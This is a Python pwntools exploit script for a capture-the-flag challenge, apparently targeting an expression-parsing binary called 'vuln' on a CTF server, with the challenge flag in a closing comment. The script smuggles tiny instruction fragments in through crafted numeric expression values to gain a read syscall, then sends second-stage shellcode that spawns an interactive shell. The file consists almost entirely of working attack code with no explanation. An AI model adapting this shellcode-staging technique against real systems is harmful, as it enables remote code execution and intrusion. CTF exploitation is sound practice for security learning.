from pwn import *
from time import sleep

CMDLINE = ["./vuln"]

elf = ELF(CMDLINE[0], checksec=False)

context.arch = "amd64"

class Exploit:
    LOCAL_HOST = "localhost"
    LOCAL_PORT = 1234
    REMOTE_HOST = "challenges.challenge-ecw.eu" 
    REMOTE_PORT = 34514

    def __init__(self) -> None:
        if args.REMOTE:
            self.io = remote(self.REMOTE_HOST, self.REMOTE_PORT)
        elif args.LOCAL:
            self.io = remote(self.LOCAL_HOST, self.LOCAL_PORT)
        else:
            self.io = process(CMDLINE)
            if args.DBG:
                print(self.io.pid)
                pause()

    def send_expression(self, exp: bytes):
        self.io.sendlineafter(b"Enter your expression> ", exp)
    
    def set_variable(self, value: int):
        self.io.sendlineafter(b" > ", str(value).encode())

    def interactive(self):
        self.io.interactive()

    def close(self):
        self.io.close()


io = Exploit()

jmp_insn = u64(b"\x48\x8d\x35\x00\x00\x00\x00\x25")
syscall = u32(b"\x31\xc0\x0f\x05")

io.send_expression(f"plus {0x41414141} plus {0x4141414141414141} plus {0x1000} plus {0x4141414141414141} plus {0x4141414141414141} plus a plus plus plus {0x8dffffff} {jmp_insn} {syscall} b".encode())

io.set_variable(0x4242424242424242)
io.set_variable(0x4343434343434343)

sleep(0.2)

sc = b''
sc += b"\x90"*0x20
sc += asm("""
mov rsp, r14
          """)
sc += asm(shellcraft.amd64.linux.sh())
sc += b'\xcc'

io.io.send(sc)

io.interactive()
io.close()

# ECW{who-would-ever-need-more-than-8-bytes-of-shellcode-72b4a69476fc1540}